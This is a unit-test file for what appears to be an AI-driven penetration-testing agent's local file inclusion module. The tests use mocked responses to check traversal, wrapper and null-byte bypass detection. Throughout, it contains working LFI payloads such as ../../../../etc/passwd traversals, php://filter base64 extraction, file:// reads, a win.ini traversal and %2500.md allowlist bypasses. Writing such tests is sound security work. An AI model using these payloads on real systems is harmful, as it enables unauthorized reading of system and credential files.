"""Unit tests for the adaptive LFI methodology phases.

Each phase is exercised in isolation with mocked ``_send_probe`` and LLM:

    Phase 1 (injection-point mapping)   — three-probe baseline (original,
                                          ``../``, ``/etc/passwd``)
    Phase 2 (path-handling fingerprint) — traversal sequences, wrapper
                                          probing, prefix / suffix handling
    Phase 3 (retrieval-type ranking)    — LLM JSON parsing + fallback table
    Phase 4 (payload synthesis)         — LLM JSON parsing + fallback table
    Phase 5 (verification)              — file-signature regex matching

Plus an end-to-end run that drives all six phases through one ``page``.
"""

from __future__ import annotations

import base64
from typing import Any
from unittest.mock import AsyncMock

import pytest

from clinkz.agents._methodology_helpers import BaselineProbe
from clinkz.agents._plan_ranking import attempt_window, rank_lfi
from clinkz.agents.exploit import (
    ExploitAgent,
    PageAnalysis,
    _HTTPResponse,
    _is_file_server_path,
)
from clinkz.llm.base import LLMClient, LLMMessage
from clinkz.models.methodology import (
    LFIMethodologyResult,
    LFIRetrievalType,
    LFITraversalPrimitives,
)
from clinkz.models.scope import EngagementScope, ScopeEntry, ScopeType
from clinkz.state import StateStore
from clinkz.tools.resolver import ToolResolver

SCOPE = EngagementScope(
    name="methodology-lfi-test",
    targets=[ScopeEntry(value="example.com", type=ScopeType.DOMAIN)],
)


class _ScriptedLLM(LLMClient):
    """LLM client whose ``generate_text`` returns answers in queue order."""

    def __init__(self, answers: list[str] | None = None) -> None:
        self.prompts: list[str] = []
        self.answers: list[str] = list(answers or [])

    async def reason(
        self, messages: list[LLMMessage], tools: list[dict[str, Any]] | None = None
    ) -> Any:
        raise NotImplementedError

    async def research(self, query: str) -> str:
        return ""

    async def generate_text(self, prompt: str, **_kw: object) -> str:
        self.prompts.append(prompt)
        if not self.answers:
            return ""
        return self.answers.pop(0)


def _make_state() -> AsyncMock:
    state = AsyncMock(spec=StateStore)
    state.get_findings = AsyncMock(return_value=[])
    state.add_finding = AsyncMock(return_value="finding-001")
    state.get_new_endpoints = AsyncMock(return_value=[])
    state.log_action = AsyncMock()
    return state


def _make_agent(llm: LLMClient | None = None) -> ExploitAgent:
    agent = ExploitAgent(
        llm=llm or _ScriptedLLM(),
        tools=[],
        scope=SCOPE,
        state=_make_state(),
        engagement_id="methodology-lfi-test",
        resolver=ToolResolver(),
        persistent_kb=None,
    )
    agent._methodology_llm = agent.llm
    return agent


def _make_page(
    url: str = "http://example.com/?page=index.php", params: list[str] | None = None
) -> PageAnalysis:
    return PageAnalysis(
        url=url,
        body="",
        status=200,
        input_params=params or ["page"],
    )


def _baseline(value: str = "index.php", body: str = "content") -> BaselineProbe:
    return BaselineProbe(
        variant="original",
        value=value,
        status=200,
        length=len(body),
        body_hash="a" * 16,
        time_ms=10.0,
        body=body,
    )


# ===========================================================================
# Phase 1 — Injection-point mapping
# ===========================================================================


class TestPhase1InjectionPointMapping:
    """Three-probe baseline must pick out path-traversal-affected params."""

    @pytest.mark.asyncio
    async def test_no_divergence_not_a_candidate(self) -> None:
        agent = _make_agent()
        body = "<html><body>page</body></html>"
        agent._send_probe = AsyncMock(  # type: ignore[method-assign]
            return_value=_HTTPResponse(status=200, body=body)
        )
        page = _make_page()
        is_candidate, baselines = await agent._lfi_phase1_injection_point(page, "page")
        assert is_candidate is False
        assert len(baselines) == 3

    @pytest.mark.asyncio
    async def test_traversal_makes_response_diverge(self) -> None:
        agent = _make_agent()

        async def fake_probe(_page: PageAnalysis, _param: str, value: str) -> _HTTPResponse:
            if "../" in value or value.startswith("/etc/"):
                return _HTTPResponse(status=200, body="root:x:0:0:root:/root:/bin/bash")
            return _HTTPResponse(status=200, body="<html>page</html>")

        agent._send_probe = fake_probe  # type: ignore[method-assign]
        page = _make_page()
        is_candidate, _baselines = await agent._lfi_phase1_injection_point(page, "page")
        assert is_candidate is True

    @pytest.mark.asyncio
    async def test_no_param_name_heuristic_required(self) -> None:
        """Phase 1 candidacy must NOT depend on the param name suggesting a file."""
        agent = _make_agent()

        async def fake_probe(_page: PageAnalysis, _param: str, value: str) -> _HTTPResponse:
            if "../" in value or value.startswith("/etc/"):
                return _HTTPResponse(status=200, body="root:x:0:0:root")
            return _HTTPResponse(status=200, body="ok")

        agent._send_probe = fake_probe  # type: ignore[method-assign]
        # `q` does NOT match the legacy `_looks_like_file_param` heuristic.
        page = PageAnalysis(
            url="http://example.com/?q=hello", body="", status=200, input_params=["q"]
        )
        is_candidate, _baselines = await agent._lfi_phase1_injection_point(page, "q")
        assert is_candidate is True


# ===========================================================================
# Phase 2 — Path-handling fingerprint
# ===========================================================================


class TestPhase2PathHandlingFingerprint:
    @pytest.mark.asyncio
    async def test_traversal_signature_match_recorded(self) -> None:
        agent = _make_agent()

        async def fake_probe(_page: PageAnalysis, _param: str, value: str) -> _HTTPResponse:
            if "../" in value or value.endswith("/etc/passwd"):
                return _HTTPResponse(
                    status=200,
                    body=("root:x:0:0:root:/root:/bin/bash\nuser:x:1000:1000::/home/user:"),
                )
            return _HTTPResponse(status=200, body="ok")

        agent._send_probe = fake_probe  # type: ignore[method-assign]
        page = _make_page()
        _candidate, baselines = await agent._lfi_phase1_injection_point(page, "page")
        primitives, evidence = await agent._lfi_phase2_fingerprint(page, "page", baselines)
        assert primitives.traversal_sequence is not None
        assert "traversal_signature_match" in evidence or "traversal_divergence_only" in evidence

    @pytest.mark.asyncio
    async def test_php_filter_wrapper_detected(self) -> None:
        agent = _make_agent()
        agent._technologies = ["php", "mysql"]  # PHP stack → wrappers are probed
        # A realistic-length PHP source so the b64 blob clears the 100-char
        # threshold the impl uses to decide a wrapper response is data.
        php_source = b"<?php\n" + (b"$config = 'top secret value';\n" * 10) + b"?>"
        b64 = base64.b64encode(php_source).decode("ascii")

        async def fake_probe(_page: PageAnalysis, _param: str, value: str) -> _HTTPResponse:
            if "php://filter" in value:
                return _HTTPResponse(status=200, body=b64)
            if "../" in value or value.endswith("/etc/passwd"):
                return _HTTPResponse(status=200, body="root:x:0:0:root")
            return _HTTPResponse(status=200, body="ok")

        agent._send_probe = fake_probe  # type: ignore[method-assign]
        page = _make_page()
        _candidate, baselines = await agent._lfi_phase1_injection_point(page, "page")
        primitives, _evidence = await agent._lfi_phase2_fingerprint(page, "page", baselines)
        assert "php://filter" in primitives.wrapper_support

    @pytest.mark.asyncio
    async def test_wrappers_skipped_on_non_php_stack(self) -> None:
        """On a Node/other stack, PHP wrappers are never probed or confirmed.

        Every odd value on a Node route 500s as "Unexpected path"; that
        divergence must NOT read as wrapper support (the Juice Shop false
        confirm). With no PHP in the stack, the wrapper loop is skipped.
        """
        agent = _make_agent()
        agent._technologies = ["node.js", "express"]  # non-PHP

        async def fake_probe(_page: PageAnalysis, _param: str, value: str) -> _HTTPResponse:
            # Any wrapper-shaped value diverges from baseline (Node 500), which
            # the old code mistook for wrapper support.
            if "://" in value:
                return _HTTPResponse(status=500, body="Error: Unexpected path: " + value)
            return _HTTPResponse(status=200, body="ok")

        agent._send_probe = fake_probe  # type: ignore[method-assign]
        page = _make_page(url="http://example.com/rest/x/:id", params=["id"])
        _candidate, baselines = await agent._lfi_phase1_injection_point(page, "id")
        primitives, evidence = await agent._lfi_phase2_fingerprint(page, "id", baselines)
        assert primitives.wrapper_support == []
        assert evidence.get("wrappers_skipped_non_php") is True


# ===========================================================================
# Phase 3 — Retrieval-type ranking
# ===========================================================================


class TestPhase3RetrievalTypeRanking:
    @pytest.mark.asyncio
    async def test_llm_ranking_parsed(self) -> None:
        llm = _ScriptedLLM(
            answers=[
                '{"ranked": ['
                '{"type": "wrapper_extraction", "rationale": "best yield"},'
                '{"type": "direct_read", "rationale": "fallback"}'
                "]}"
            ]
        )
        agent = _make_agent(llm)
        agent._methodology_llm = llm
        ranking = await agent._lfi_phase3_rank_retrieval_types(
            LFITraversalPrimitives(traversal_sequence="../", wrapper_support=["php://filter"]),
            {},
        )
        assert ranking.ranked[0] == LFIRetrievalType.WRAPPER_EXTRACTION
        assert ranking.ranked[1] == LFIRetrievalType.DIRECT_READ

    @pytest.mark.asyncio
    async def test_fallback_signature_match_prefers_direct_read(self) -> None:
        llm = _ScriptedLLM(answers=[""])
        agent = _make_agent(llm)
        agent._methodology_llm = llm
        ranking = await agent._lfi_phase3_rank_retrieval_types(
            LFITraversalPrimitives(traversal_sequence="../"),
            {"traversal_signature_match": "../"},
        )
        assert ranking.ranked[0] == LFIRetrievalType.DIRECT_READ

    @pytest.mark.asyncio
    async def test_fallback_php_filter_prefers_wrapper(self) -> None:
        llm = _ScriptedLLM(answers=[""])
        agent = _make_agent(llm)
        agent._methodology_llm = llm
        ranking = await agent._lfi_phase3_rank_retrieval_types(
            LFITraversalPrimitives(wrapper_support=["php://filter"]),
            {},
        )
        assert ranking.ranked[0] == LFIRetrievalType.WRAPPER_EXTRACTION

    @pytest.mark.asyncio
    async def test_source_disclosure_is_reachable_without_php_filter(self) -> None:
        """It used to be reachable from exactly one branch, and that was the bug.

        ``source_disclosure`` was ranked only when ``php://filter`` was among the
        confirmed wrappers, so a target exposing ``php://input`` and appending an
        extension to the parameter could not be ranked for it at all. Both of the
        corpus's ``source_disclosure`` confirmations have precisely that
        fingerprint. The signal is the PHP stream layer — any ``php://`` wrapper —
        or a suffix the handler concatenates, since an appended ``.php`` is what
        makes the parameter name a source file.
        """
        agent = _make_agent(_ScriptedLLM(answers=[""]))
        ranking = await agent._lfi_phase3_rank_retrieval_types(
            LFITraversalPrimitives(
                wrapper_support=["php://input", "file://"],
                suffix_handling="appends_extension",
            ),
            {},
        )
        assert LFIRetrievalType.SOURCE_DISCLOSURE in ranking.supported
        assert LFIRetrievalType.SOURCE_DISCLOSURE in attempt_window(
            ranking.ranked, ranking.supported
        )


# ===========================================================================
# Phase 4 — Payload synthesis
# ===========================================================================


class TestPhase4PayloadSynthesis:
    @pytest.mark.asyncio
    async def test_llm_synthesis_parsed(self) -> None:
        llm = _ScriptedLLM(
            answers=[
                '{"payload": "../../../../etc/passwd", '
                '"expected_indicator": "root:x:0:0:", '
                '"indicator_type": "file_signature", '
                '"rationale": "direct read of passwd"}'
            ]
        )
        agent = _make_agent(llm)
        agent._methodology_llm = llm
        # Non-grounded primitives (no confirmed read) so the LLM path runs — a
        # confirmed traversal/prefix/wrapper now bypasses the LLM in favour of
        # the deterministic build (see TestFix3PrefersConfirmedBuild).
        synth = await agent._lfi_phase4_synthesize_payload(
            LFIRetrievalType.DIRECT_READ,
            LFITraversalPrimitives(),
            _baseline(),
        )
        assert synth is not None
        assert synth["indicator_type"] == "file_signature"
        assert "etc/passwd" in synth["payload"]

    @pytest.mark.asyncio
    async def test_fallback_direct_read_uses_traversal_token(self) -> None:
        llm = _ScriptedLLM(answers=[""])
        agent = _make_agent(llm)
        agent._methodology_llm = llm
        synth = await agent._lfi_phase4_synthesize_payload(
            LFIRetrievalType.DIRECT_READ,
            LFITraversalPrimitives(traversal_sequence="../"),
            _baseline(),
        )
        assert synth is not None
        assert "etc/passwd" in synth["payload"]
        assert "../" in synth["payload"]
        assert synth["indicator_type"] == "file_signature"

    @pytest.mark.asyncio
    async def test_fallback_direct_read_with_prefix_required_uses_absolute(self) -> None:
        llm = _ScriptedLLM(answers=[""])
        agent = _make_agent(llm)
        agent._methodology_llm = llm
        synth = await agent._lfi_phase4_synthesize_payload(
            LFIRetrievalType.DIRECT_READ,
            LFITraversalPrimitives(traversal_sequence="../", prefix_required=True),
            _baseline(),
        )
        assert synth is not None
        assert synth["payload"] == "/etc/passwd"

    @pytest.mark.asyncio
    async def test_fallback_wrapper_extraction_requires_php_filter(self) -> None:
        llm = _ScriptedLLM(answers=[""])
        agent = _make_agent(llm)
        agent._methodology_llm = llm
        # Without php://filter wrapper support, fallback declines.
        synth = await agent._lfi_phase4_synthesize_payload(
            LFIRetrievalType.WRAPPER_EXTRACTION,
            LFITraversalPrimitives(traversal_sequence="../"),
            _baseline(),
        )
        assert synth is None
        # With php://filter, it produces a wrapper payload.
        synth = await agent._lfi_phase4_synthesize_payload(
            LFIRetrievalType.WRAPPER_EXTRACTION,
            LFITraversalPrimitives(wrapper_support=["php://filter"]),
            _baseline(),
        )
        assert synth is not None
        assert "php://filter" in synth["payload"]
        assert synth["indicator_type"] == "base64_blob"


# ===========================================================================
# Phase 5 — Verification
# ===========================================================================


class TestPhase5Verification:
    @pytest.mark.asyncio
    async def test_file_signature_passwd_matched(self) -> None:
        agent = _make_agent()
        agent._send_probe = AsyncMock(  # type: ignore[method-assign]
            return_value=_HTTPResponse(
                status=200,
                body="root:x:0:0:root:/root:/bin/bash\nuser:x:1000:1000::/home/user:",
            )
        )
        synth = {
            "payload": "../../../../etc/passwd",
            "indicator_type": "file_signature",
            "expected_indicator": "root:x:0:0:",
        }
        verified, observed, _ev = await agent._lfi_phase5_verify(_make_page(), "page", synth)
        assert verified is True
        assert "passwd" in observed.lower()

    @pytest.mark.asyncio
    async def test_confirmation_evidence_pair_is_raw_auditable(self) -> None:
        """A verified file read carries the raw P3 pair: leaked bytes + benign control.

        The confirming probe reads /etc/passwd; the benign non-traversal control
        reads no file — so the signature (marker) appears ONLY in the confirming
        response, proving it is fetched file content, not response chrome (§4.6,
        file read is ConfirmationEvidence's second consumer after SSRF).
        """
        agent = _make_agent()
        agent._send_probe = AsyncMock(  # type: ignore[method-assign]
            side_effect=[
                _HTTPResponse(status=200, body="root:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin"),
                _HTTPResponse(status=404, body='{"errors":["This file does not exist."]}'),
            ]
        )
        synth = {
            "payload": "%252e%252e%252fetc/passwd",
            "indicator_type": "file_signature",
            "expected_indicator": "root:x:0:0:",
        }
        verified, _observed, evidence = await agent._lfi_phase5_verify(_make_page(), "page", synth)
        assert verified is True
        assert evidence is not None
        assert evidence.primitive == "P3"
        assert evidence.confirming_marker == "root:x:0:0:"
        assert "root:x:0:0:" in evidence.confirming_excerpt
        assert evidence.control_confirms is False  # control read no file — marker absent
        assert evidence.control_status == 404

    @pytest.mark.asyncio
    async def test_file_signature_winini_matched(self) -> None:
        agent = _make_agent()
        agent._send_probe = AsyncMock(  # type: ignore[method-assign]
            return_value=_HTTPResponse(
                status=200,
                body="; for 16-bit app support\n[fonts]\n[extensions]\n",
            )
        )
        synth = {
            "payload": "..\\..\\..\\..\\windows\\win.ini",
            "indicator_type": "file_signature",
            "expected_indicator": "[fonts]",
        }
        verified, observed, _ev = await agent._lfi_phase5_verify(_make_page(), "page", synth)
        assert verified is True
        assert "win.ini" in observed.lower() or "[fonts]" in observed.lower()

    @pytest.mark.asyncio
    async def test_base64_blob_decodes_to_passwd(self) -> None:
        agent = _make_agent()
        # Make the base64 blob long enough to clear the 100-char threshold.
        passwd = (
            b"root:x:0:0:root:/root:/bin/bash\n"
            b"daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
            b"bin:x:2:2:bin:/bin:/usr/sbin/nologin\n"
            b"sys:x:3:3:sys:/dev:/usr/sbin/nologin\n"
        )
        b64 = base64.b64encode(passwd).decode("ascii")
        agent._send_probe = AsyncMock(  # type: ignore[method-assign]
            return_value=_HTTPResponse(status=200, body=b64)
        )
        synth = {
            "payload": "php://filter/convert.base64-encode/resource=/etc/passwd",
            "indicator_type": "base64_blob",
            "expected_indicator": "passwd",
        }
        verified, observed, _ev = await agent._lfi_phase5_verify(_make_page(), "page", synth)
        assert verified is True
        assert "decode" in observed.lower()

    @pytest.mark.asyncio
    async def test_path_disclosure_alone_does_not_confirm(self) -> None:
        """LFI requires reading file content, not merely disclosing a path.

        A filesystem path in a stack trace (PHP warning here, or Juice Shop's
        Node "Unexpected path" 500 on an invalid :id) is information
        disclosure — confirming on it invented LFI findings. The disclosed
        path is recorded only as a weak hint.
        """
        agent = _make_agent()
        agent._send_probe = AsyncMock(  # type: ignore[method-assign]
            return_value=_HTTPResponse(
                status=500,
                body=(
                    "Warning: include(/var/www/html/uploads/clinkz_no_such_file): "
                    "failed to open stream: No such file or directory in "
                    "/var/www/html/index.php on line 42"
                ),
            )
        )
        synth = {
            "payload": "../../../clinkz_no_such_file",
            "indicator_type": "error_path",
            "expected_indicator": "filesystem path",
        }
        verified, observed, _ev = await agent._lfi_phase5_verify(_make_page(), "page", synth)
        assert verified is False
        assert "no file content read" in observed
        assert "/var/www" in observed  # disclosed path recorded as a hint

    @pytest.mark.asyncio
    async def test_error_path_confirms_when_file_content_present(self) -> None:
        """If the forced error actually leaks file content, that DOES confirm."""
        agent = _make_agent()
        agent._send_probe = AsyncMock(  # type: ignore[method-assign]
            return_value=_HTTPResponse(
                status=200, body="root:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin"
            )
        )
        synth = {
            "payload": "../../../etc/passwd",
            "indicator_type": "error_path",
            "expected_indicator": "filesystem path",
        }
        verified, observed, _ev = await agent._lfi_phase5_verify(_make_page(), "page", synth)
        assert verified is True
        assert "passwd" in observed

    @pytest.mark.asyncio
    async def test_no_signature_means_not_verified(self) -> None:
        agent = _make_agent()
        agent._send_probe = AsyncMock(  # type: ignore[method-assign]
            return_value=_HTTPResponse(status=200, body="<html>nothing relevant</html>")
        )
        synth = {
            "payload": "../../../../etc/passwd",
            "indicator_type": "file_signature",
            "expected_indicator": "root:x",
        }
        verified, _observed, _ev = await agent._lfi_phase5_verify(_make_page(), "page", synth)
        assert verified is False


# ===========================================================================
# Regression — phase-5 must accept the LIVE LLM's indicator_type vocabulary
# AND extract a base64 blob embedded in the page HTML.
#
# Pipeline trace 77031b28: the Anthropic LLM synthesised a php://filter payload
# with indicator_type "base64_encoded_string" (unmapped → "unknown
# indicator_type"); and even mapped, the old base64_blob branch decoded the
# WHOLE HTML body (which is not pure base64) and the expected indicator
# (base64 of "root:x:0:0:") does not align to the blob's chunk boundaries. The
# real response embedded `cm9vdDp4OjA6MDpy...` inside the page, decoding to
# `root:x:0:0:root:...`. Smoke passed because its silent LLM forces the
# canonical-label / plain-traversal fallback. These gates exercise the LLM path.
# ===========================================================================


def _passwd_filter_page() -> str:
    """A DVWA-style fi page with the php://filter base64 blob embedded in HTML."""
    passwd = (
        b"root:x:0:0:root:/root:/bin/bash\n"
        b"daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
        b"bin:x:2:2:bin:/bin:/usr/sbin/nologin\n"
        b"sys:x:3:3:sys:/dev:/usr/sbin/nologin\n"
    )
    blob = base64.b64encode(passwd).decode("ascii")
    return f"<html><body><div class='vulnerable_code_area'>{blob}</div></body></html>"


class TestPhase5LLMVocabulary:
    def test_keyword_classifier_maps_llm_vocabulary(self) -> None:
        assert ExploitAgent._classify_lfi_indicator("base64_encoded_string") == "base64_blob"
        assert ExploitAgent._classify_lfi_indicator("wrapper_blob") == "base64_blob"
        assert ExploitAgent._classify_lfi_indicator("path_disclosure") == "error_path"
        assert ExploitAgent._classify_lfi_indicator("file_content") == "file_signature"
        assert ExploitAgent._classify_lfi_indicator(None) == "file_signature"

    @pytest.mark.asyncio
    async def test_base64_encoded_string_label_verifies_embedded_blob(self) -> None:
        """``indicator_type='base64_encoded_string'`` with a misaligned expected
        indicator must still verify by decoding the embedded blob (the exact
        77031b28 direct_read miss)."""
        agent = _make_agent()
        agent._send_probe = AsyncMock(  # type: ignore[method-assign]
            return_value=_HTTPResponse(status=200, body=_passwd_filter_page())
        )
        synth = {
            "payload": "php://filter/convert.base64-encode/resource=../../../../../../../etc/passwd",
            "indicator_type": "base64_encoded_string",
            # base64 of "root:x:0:0:" — does NOT byte-align inside the file blob.
            "expected_indicator": "cm9vdDp4OjA6MDo",
        }
        verified, observed, _ev = await agent._lfi_phase5_verify(_make_page(), "page", synth)
        assert verified is True
        assert "passwd" in observed.lower()

    @pytest.mark.asyncio
    async def test_no_false_positive_on_non_vuln_page(self) -> None:
        """A page with no decodable file blob must not verify, even when the LLM
        declared a base64 indicator."""
        agent = _make_agent()
        agent._send_probe = AsyncMock(  # type: ignore[method-assign]
            return_value=_HTTPResponse(
                status=200, body="<html><body>Sorry, that file was not found.</body></html>"
            )
        )
        synth = {
            "payload": "php://filter/convert.base64-encode/resource=../../../../etc/passwd",
            "indicator_type": "base64_encoded_string",
            "expected_indicator": "cm9vdDp4OjA6MDo",
        }
        verified, _, _ev = await agent._lfi_phase5_verify(_make_page(), "page", synth)
        assert verified is False


# ===========================================================================
# Phase 6 — Finding emission
# ===========================================================================


class TestPhase6FindingEmission:
    def test_finding_carries_evidence_chain(self) -> None:
        agent = _make_agent()
        result = LFIMethodologyResult(
            phases_completed=6,
            primitives=LFITraversalPrimitives(
                traversal_sequence="../", wrapper_support=["php://filter"]
            ),
            retrieval_type=LFIRetrievalType.DIRECT_READ,
            synthesized_payload="../../../../etc/passwd",
            expected_indicator="root:x:0:0:",
            indicator_type="file_signature",
            indicator_observed="matched /etc/passwd signature",
            verified=True,
            verification_strength="verified",
        )
        finding = agent._lfi_phase6_emit("http://x/?page=hello", "page", result)
        joined = " ".join(finding.evidence)
        assert "phases_completed=6" in joined
        assert "retrieval_type=direct_read" in joined
        assert "etc/passwd" in joined
        assert finding.severity.value == "high"
        assert "local file inclusion" in finding.title.lower()


# ===========================================================================
# Integration — full _test_lfi driving all six phases
# ===========================================================================


class TestLFIMethodologyIntegration:
    @pytest.mark.asyncio
    async def test_dvwa_low_style_direct_read_finding(self) -> None:
        """End-to-end: ../etc/passwd reflects file content → finding emitted."""
        agent = _make_agent(_ScriptedLLM(answers=[""]))
        agent._methodology_llm = agent.llm

        async def fake_probe(_page: PageAnalysis, _param: str, value: str) -> _HTTPResponse:
            if "../" in value or value.startswith("/etc/passwd"):
                return _HTTPResponse(
                    status=200,
                    body="root:x:0:0:root:/root:/bin/bash\nuser:x:1000:1000::/home/user:",
                )
            return _HTTPResponse(status=200, body="<html>page</html>")

        agent._send_probe = fake_probe  # type: ignore[method-assign]
        page = _make_page("http://example.com/?page=index.php", params=["page"])
        findings = await agent._test_lfi(page)
        assert len(findings) == 1
        joined = " ".join(findings[0].evidence)
        assert "retrieval_type=direct_read" in joined
        assert "phases_completed=6" in joined

    @pytest.mark.asyncio
    async def test_no_finding_when_param_does_not_diverge(self) -> None:
        agent = _make_agent(_ScriptedLLM(answers=[""]))
        agent._methodology_llm = agent.llm
        agent._send_probe = AsyncMock(  # type: ignore[method-assign]
            return_value=_HTTPResponse(status=200, body="<html>safe</html>")
        )
        page = _make_page("http://example.com/?page=hello", params=["page"])
        findings = await agent._test_lfi(page)
        assert findings == []


# ===========================================================================
# FIX 2b — static file-server poison-null-byte bypass (/ftp)
# ===========================================================================


class TestFileServerPathDetection:
    def test_recognises_file_server_dirs(self) -> None:
        assert _is_file_server_path("/ftp/legal.md") is True
        assert _is_file_server_path("/ftp") is True
        assert _is_file_server_path("/files/docs/x.pdf") is True
        assert _is_file_server_path("/rest/products/search") is False
        assert _is_file_server_path("/") is False

    def test_file_server_base_strips_trailing_file(self) -> None:
        assert ExploitAgent._file_server_base("http://h:3000/ftp/legal.md") == "http://h:3000/ftp"
        assert ExploitAgent._file_server_base("http://h:3000/ftp") == "http://h:3000/ftp"

    def test_applicable_methods_queues_lfi_for_paramless_file_server(self) -> None:
        """A param-less /ftp/<file> endpoint must still get _test_lfi queued."""
        from clinkz.models.scan import Endpoint

        agent = _make_agent()
        ep = Endpoint(url="http://example.com/ftp/legal.md", method="GET", params=[])
        methods = agent._applicable_methods_for_endpoint(ep)
        assert "_test_lfi" in methods
        # A param-less non-file-server path does NOT get LFI.
        ep2 = Endpoint(url="http://example.com/about", method="GET", params=[])
        assert "_test_lfi" not in agent._applicable_methods_for_endpoint(ep2)


class TestFileServerNullByteBypass:
    @pytest.mark.asyncio
    async def test_blocked_file_read_via_null_byte_confirms(self) -> None:
        """Direct GET blocked (403) but null-byte read returns content → finding."""
        agent = _make_agent()
        pkg = '{"name":"juice-shop","version":"1.0.0","dependencies":{"express":"4"}}'

        async def fake_get(url: str, _params: dict[str, str]) -> _HTTPResponse:
            if url.endswith("/ftp"):
                return _HTTPResponse(status=200, body='<a href="legal.md">legal.md</a>')
            if "%2500.md" in url or "%00.md" in url:
                return _HTTPResponse(status=200, body=pkg)
            # direct GET of a .bak → extension allowlist rejection
            if url.endswith(".bak"):
                return _HTTPResponse(status=403, body="Error: only .md and .pdf files are allowed!")
            return _HTTPResponse(status=404, body="not found")

        agent._http_get = fake_get  # type: ignore[method-assign]
        page = _make_page("http://example.com/ftp/legal.md", params=[])
        findings = await agent._test_lfi_file_server(page)
        assert len(findings) >= 1
        joined = " ".join(findings[0].evidence)
        assert "bypass_suffix=%2500.md" in joined
        assert findings[0].severity.value == "high"

    @pytest.mark.asyncio
    async def test_public_file_is_not_flagged(self) -> None:
        """A directly-readable file (200) is public, not a bypass — no finding."""
        agent = _make_agent()

        async def fake_get(url: str, _params: dict[str, str]) -> _HTTPResponse:
            if url.endswith("/ftp"):
                return _HTTPResponse(status=200, body="<html>no links</html>")
            # everything is directly readable → no allowlist to bypass
            return _HTTPResponse(status=200, body="public content " * 5)

        agent._http_get = fake_get  # type: ignore[method-assign]
        page = _make_page("http://example.com/ftp/legal.md", params=[])
        findings = await agent._test_lfi_file_server(page)
        assert findings == []

    @pytest.mark.asyncio
    async def test_spa_catch_all_not_treated_as_file_read(self) -> None:
        """A 200 SPA shell on the null-byte request is not a file read."""
        agent = _make_agent()
        spa = (
            "<html><head><title>JuiceShop</title></head><body><app-root></app-root>"
            '<script src="main.a1b2c3.js"></script></body></html>'
        )

        async def fake_get(url: str, _params: dict[str, str]) -> _HTTPResponse:
            if url.endswith("/ftp"):
                return _HTTPResponse(status=200, body="<html></html>")
            if "%2500.md" in url or "%00.md" in url:
                return _HTTPResponse(status=200, body=spa)  # SPA catch-all
            if url.endswith(".bak"):
                return _HTTPResponse(status=403, body="only .md and .pdf files are allowed!")
            return _HTTPResponse(status=404, body="nope")

        agent._http_get = fake_get  # type: ignore[method-assign]
        page = _make_page("http://example.com/ftp/legal.md", params=[])
        findings = await agent._test_lfi_file_server(page)
        assert findings == []

    @pytest.mark.asyncio
    async def test_non_file_server_path_skipped(self) -> None:
        agent = _make_agent()
        called = False

        async def fake_get(url: str, _params: dict[str, str]) -> _HTTPResponse:
            nonlocal called
            called = True
            return _HTTPResponse(status=200, body="x")

        agent._http_get = fake_get  # type: ignore[method-assign]
        page = _make_page("http://example.com/rest/products/search?q=1", params=["q"])
        findings = await agent._test_lfi_file_server(page)
        assert findings == []
        assert called is False  # never probed a non-file-server path

    @pytest.mark.asyncio
    async def test_base_probed_once_per_engagement(self) -> None:
        """A second /ftp/<file> endpoint reuses the dedup guard (no re-probe)."""
        agent = _make_agent()
        calls = {"n": 0}

        async def fake_get(url: str, _params: dict[str, str]) -> _HTTPResponse:
            calls["n"] += 1
            return _HTTPResponse(status=404, body="nope")

        agent._http_get = fake_get  # type: ignore[method-assign]
        page1 = _make_page("http://example.com/ftp/legal.md", params=[])
        page2 = _make_page("http://example.com/ftp/order_1.pdf", params=[])
        await agent._test_lfi_file_server(page1)
        first = calls["n"]
        await agent._test_lfi_file_server(page2)
        assert calls["n"] == first  # second call short-circuited on the dedup set


# ===========================================================================
# FIX 2 — bypass-adaptive LFI (DVWA fi/high: fnmatch("file*") filter)
# ===========================================================================


class TestFix2BypassAdaptive:
    """Traversal honesty, file:// wrapper synthesis, prefix-preserving traversal."""

    @staticmethod
    def _filtered_probe(passwd_for: set[str]):
        """A fake `_send_probe` where naive traversal / wrappers are filtered to a
        block page and only *passwd_for* payload values read /etc/passwd."""

        async def fake_probe(_page: PageAnalysis, _param: str, value: str) -> _HTTPResponse:
            if value in passwd_for:
                return _HTTPResponse(status=200, body="root:x:0:0:root:/root:/bin/bash")
            if "etc/passwd" in value or "://" in value:
                return _HTTPResponse(status=200, body="ERROR: File not found!")
            return _HTTPResponse(status=200, body="X" * 5000)  # normal page

        return fake_probe

    @pytest.mark.asyncio
    async def test_block_page_divergence_not_recorded_as_traversal(self) -> None:
        """FIX 2c: a filtered ``../`` returning a block page diverges from the
        baseline but reads no file — it must NOT be recorded as a working
        traversal sequence."""
        agent = _make_agent()
        agent._technologies = ["php"]
        agent._send_probe = self._filtered_probe(set())  # type: ignore[method-assign]
        page = _make_page()
        _cand, baselines = await agent._lfi_phase1_injection_point(page, "page")
        primitives, evidence = await agent._lfi_phase2_fingerprint(page, "page", baselines)
        assert primitives.traversal_sequence is None
        assert "traversal_divergence_only" not in evidence
        assert primitives.wrapper_support == []  # no wrapper confirmed on divergence

    @pytest.mark.asyncio
    async def test_file_wrapper_detected_and_synthesized(self) -> None:
        """FIX 2b: file:// is confirmed (reads /etc/passwd) even when naive ``../``
        is filtered, and phase 4 synthesizes the file:// read."""
        agent = _make_agent()
        agent._technologies = ["php"]
        agent._send_probe = self._filtered_probe(  # type: ignore[method-assign]
            {"file:///etc/passwd"}
        )
        page = _make_page()
        _cand, baselines = await agent._lfi_phase1_injection_point(page, "page")
        primitives, _evidence = await agent._lfi_phase2_fingerprint(page, "page", baselines)
        assert "file://" in primitives.wrapper_support
        assert primitives.traversal_sequence is None  # naive traversal stays honest
        synth = await agent._lfi_phase4_synthesize_payload(
            LFIRetrievalType.WRAPPER_EXTRACTION, primitives, _baseline()
        )
        assert synth is not None
        assert synth["payload"] == "file:///etc/passwd"
        assert synth["indicator_type"] == "file_signature"

    def test_fallback_ranks_wrapper_first_with_file_scheme(self) -> None:
        """FIX 2b: a confirmed non-php-filter wrapper (file://) ranks wrapper
        extraction first even with no traversal signature."""
        ranking = rank_lfi(LFITraversalPrimitives(wrapper_support=["file://"]), {})
        assert ranking.ranked[0] == LFIRetrievalType.WRAPPER_EXTRACTION

    @pytest.mark.asyncio
    async def test_direct_read_prefix_preserving_when_naive_blocked(self) -> None:
        """FIX 2a: naive traversal blocked + a leading token in the original value
